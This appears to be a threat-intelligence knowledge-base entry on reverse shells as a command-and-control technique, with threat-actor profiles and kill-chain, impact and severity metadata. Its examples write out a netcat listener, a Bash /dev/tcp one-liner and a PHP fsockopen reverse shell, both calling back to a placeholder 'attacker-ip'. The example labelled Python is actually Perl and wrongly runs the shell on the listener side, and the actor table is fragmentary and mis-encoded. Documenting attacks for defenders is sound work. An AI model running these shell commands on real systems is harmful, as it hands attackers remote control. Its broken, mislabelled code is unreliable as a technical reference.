## üëÅÔ∏è Description

> ### Threat vector
> A reverse shell is a technique that refers to a situation
> where adversaries, who have successfully compromised a system,
> establish a connection to their own system or server.
> This connection allows the adversaries to gain remote access 
> and control over the compromised system, enabling them to 
> execute commands and perform malicious actions.  
> 
> ### Command&Control phases
> Below are the phases of how a reverse shell works:  
> 
> - System compromise: the adversaries must succeed in compromising
>   the security of the system. This may involve exploiting vulnerabilities
>   in the software, misconfiguration, tricking the user into running a 
>   malicious program, or via other ways.  
> 
> - Establishing a reverse connection: Once the system has been compromised,
>   the adversaries set up a reverse connection from the compromised system
>   to their own. This is often done using a malicious application or script
>   that runs on the compromised system and communicates with a server controlled 
>   by adversaries.  
> 
> - Remote control: With the reverse connection established, adversaries can
>   have full or partial access and control over the compromised system. This 
>   allows them to execute commands, manipulate files, steal information, install
>   additional malware, modify configurations and perform other actions according 
>   to their goals.  
> 
> ### Code examples of reverse shells:
> 
> #### Example 1 - Bash
>       
>   Start a listener on the attackers machine
>   `nc -nlvp 4444`
> 
>   On the target machine, use Bash to establish a connection back to the listener
>   `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
> 
>   This code assumes that the attacker has started a listener on their machine using
>   the nc (netcat) utility, which is listening on a specified port (in this case, 4444). 
>   The second line of code, which is executed on the target machine, uses Bash to open
>   a connection back to the listener and establish a command shell. 
> 
> #### Example 2 - PHP
> 
>   The attacker establishes a command shell on a remote machine by exploiting a
>   vulnerability in the target system and using PHP, a server-side scripting language,
>   to execute commands on the target machine:
> 
> ```
>   <?php
>   // Start a listener on the attacker's machine
>   $sock=fsockopen("attacker-ip", 4444);
>   exec("/bin/sh -i <&3 >&3 2>&3");
>   ?>
> ```
> 
> The PHP code uses the fsockopen() function to open a connection to the listener and
> the exec() function to execute the /bin/sh shell and redirect its input, output, and
> error streams to the connection with the listener.
> 
> #### Example 3 - Python
> 
> This code example can be used to establish a command shell on a remote machine.
> 
> Start a listener on the attackers machine
> ```
>   use IO::Socket;
>   $|=1;
>   $socket = new IO::Socket::INET (
>       LocalHost => '0.0.0.0',
>       LocalPort => '4444',
>       Proto => 'tcp',
>       Listen => 1,
>       Reuse => 1
>   );
> 
>   Wait for a connection from the target machine
>   $new_socket = $socket->accept();
> 
>   Open a command shell on the target machine
>   system("/bin/sh -i <&3 >&3 2>&3");
> 
>   Close the connection
>   $new_socket->close();
> ```
>

| APT29              | A 2015 report by F-Secure describe APT29 as: 'The Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. The Dukes show unusual confidence in their ability to continue successfully compromising their targets, as well as in their ability to operate with impunity. The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States;Asian, African, and Middle Eastern governments;organizations associated with Chechen extremism;and Russian speakers engaged in the illicit trade of controlled substances and drugs. The Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, CloudDuke, SeaDuke, HammerDuke, PinchDuke, and GeminiDuke. In recent years, the Dukes have engaged in apparently biannual large - scale spear - phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and affiliated organizations. These campaigns utilize a smash - and - grab approach involving a fast but noisy breakin followed by the rapid collection and exfiltration of as much data as possible.If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long - term intelligence gathering. This threat actor targets government ministries and agencies in the West, Central Asia, East Africa, and the Middle East; Chechen extremist groups; Russian organized crime; and think tanks. It is suspected to be behind the 2015 compromise of unclassified networks at the White House, Department of State, Pentagon, and the Joint Chiefs of Staff. The threat actor includes all of the Dukes tool sets, including MiniDuke, CosmicDuke, OnionDuke, CozyDuke, SeaDuke, CloudDuke (aka MiniDionis), and HammerDuke (aka Hammertoss).

|                    | OilRig is an active and organized threat group, which is evident based on their systematic targeting of specific organizations that appear to be carefully chosen for strategic purposes. Attacks attributed to this group primarily rely on social engineering to exploit the human rather than software vulnerabilities; however, on occasion this group has used recently patched vulnerabilities in the delivery phase of their attacks. The lack of software vulnerability exploitation does not necessarily suggest a lack of sophistication, as OilRig has shown maturity in other aspects of their operations. Such maturities involve:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |                                                                                                                                                                                            |                            |                        |                          |

|                    | OilRig relies on stolen account credentials for lateral movement. After OilRig gains access to a system, they use credential dumping tools, such as Mimikatz, to steal credentials to accounts logged into the compromised system. The group uses these credentials to access and to move laterally to other systems on the network. After obtaining credentials from a system, operators in this group prefer to use tools other than their backdoors to access the compromised systems, such as remote desktop and putty. OilRig also uses phishing sites to harvest credentials to individuals at targeted organizations to gain access to internet accessible resources, such as Outlook Web Access.Since at least 2014, an Iranian threat group tracked by FireEye as APT34 has conducted reconnaissance aligned with the strategic interests of Iran. The group conducts operations primarily in the Middle East, targeting financial, government, energy, chemical, telecommunications and other industries. Repeated targeting of Middle Eastern financial, energy and government organizations leads FireEye to assess that those sectors are a primary concern of APT34. The use of infrastructure tied to Iranian operations, timing and alignment with the national interests of Iran also lead FireEye to assess that APT34 acts on behalf of the Iranian government.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |                                                                                                                                                                                            |                            |                        |                          |
| Whitefly           | In July 2018, an attack on Singapore‚Äôs largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |                                                                                                                                                                                            | üåå MISP Threat Actor Galaxy | No documented sighting | No documented references |

## Model Data

#### **‚õìÔ∏è Cyber Kill Chain**

 > Cyber attacks are typically phased progressions towards strategic objectives. The Unified Kill Chains provides insight into the tactics that hackers employ to attain these objectives. This provides a solid basis to develop (or realign) defensive strategies to raise cyber resilience.

 [`üïπÔ∏è Command & Control`](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf) : Techniques that allow attackers to communicate with controlled systems within a target network.

---

#### **üõ∞Ô∏è Domains**

 > Infrastructure technologies domain of interest to attackers.

  - `‚òÅÔ∏è Public Cloud` : Infrastructure handled by a commercial cloud provider. Managed mostly on a service level, and connected over the internet.
 - `‚òÅÔ∏è Private Cloud` : Infrastructure hosted at a third party, but based on custom specification and managed on a platform level.
 - `üè¢ Enterprise` : Generic databases, applications, machines and systems that are usually on premises or on Cloud traditional VMs.
 - `üåê Networking` : Communications backbone connecting users, applications and machines.

#### **üí£ Severity**

 > The severity summarizes the overall danger of incident the vector will provoke, and is to be derived (WIP) from impact, leverage, and difficulty to execute.

 [`‚ö†Ô∏è Significant incident`](https://www.ncsc.gov.uk/news/new-cyber-attack-categorisation-system-improve-uk-response-incidents) : A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services.

---

#### **ü™Ñ Leverage acquisition**

 > Technical aftermath of the attack from the target perspective, differentiated from impact as it does not consider the value of the consequence, only what increased control the vector execution provides to the adversary.

  - [`üóø Repudiation`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action aimed at performing prohibited operations in a system that lacks the ability to trace the operations.
 - [`üíÄ Infrastructure Compromise`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : The compromised target is likely to be used to further expand the sphere of influence of the attacker and allow more potent vectors to be executed.
 - [`üëÅÔ∏è‚Äçüó®Ô∏è Information Disclosure`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to read a file that one was not granted access to, or to read data in transit.
 - [`üíÖ Elevation of privilege`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Capacity to augment leverage over the target system by upgrading the compromised access rights
 - [`ü¶† Dwelling`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Active or passive extended presence in the target, which performs adversarial operations continuously.
 - [`‚öôÔ∏è Modify configuration`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Modify configuration or services

---

#### **üí• Impact**

 > Analysis of the threat vector from the organizational perspective, in non technical term. This aims at putting a clear denomination on what the attacker will actually be able to act upon if the threat vector is realized.

  - [`ü©º Impairement`](http://veriscommunity.net/enums.html#section-impact) : Incapacitation of a particular key system that will cause disruptions in day-to-day operations, and eventually service delivery.
 - [`üîì Data Breach`](http://veriscommunity.net/enums.html#section-impact) : Non-public information has been accessed from the outside, and successfully extracted.
 - [`üåç Reputational Damages`](http://veriscommunity.net/enums.html#section-impact) : Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.

---

#### **üé≤ Vector Viability**

 > Described with estimative language (likelyhood probability), describes how likely the analyst believes the vector to actually be realized on the organization infrastructure. Estimative language describes quality and credibility of underlying sources, data, and methodologies based Intelligence Community Directive 203 (ICD 203) and JP 2-0, Joint Intelligence.

 [`üßê Likely`](https://www.dni.gov/files/documents/ICD/ICD%20203%20Analytic%20Standards.pdf) : Probable (probably) - 55-80%
